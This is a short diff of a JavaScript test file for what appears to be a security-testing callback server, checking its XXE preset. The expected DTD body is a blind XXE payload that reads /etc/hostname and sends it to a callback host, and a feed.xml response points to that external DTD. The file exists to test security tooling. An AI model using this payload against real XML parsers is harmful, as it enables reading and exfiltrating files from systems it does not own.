@@ -113,7 +113,7 @@ test("rules: the XXE preset answers by path; everything else gets the default re
   assert.equal(dtd.headers.find(([n]) => n === "Content-Type")[1], "application/xml-dtd");
   assert.equal(dtd.body.toString(), `<!ENTITY % file SYSTEM "file:///etc/hostname">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://kx0.${host}/d?d=%file;'>">\n%eval;\n%exfil;\n`);
   assert.equal(respond(rule, 1, req("https", "/fetch/k/kx6/x.dtd", `${ID}.${DOMAIN}`)).answer.part, "x.dtd", "HTTPS, tag in the path");
-  assert.match(respond(rule, 1, req("http", "/feed.xml")).body.toString(), new RegExp(`<!DOCTYPE rss SYSTEM "http://kx0\\.${host.replace(/\./g, "\\.")}/x\\.dtd">`));
+  assert.match(respond(rule, 1, req("http", "/feed.xml")).body.toString(), new RegExp(`<!DOCTYPE rss SYSTEM "http://kx8\\.${host.replace(/\./g, "\\.")}/x\\.dtd">`));
   const data = respond(rule, 1, req("http", "/d?d=user", `kx0.${host}`));
   assert.equal(data.answer.part, undefined);
   assert.match(data.body.toString(), /<html>/, "exfil lands on the default reply");
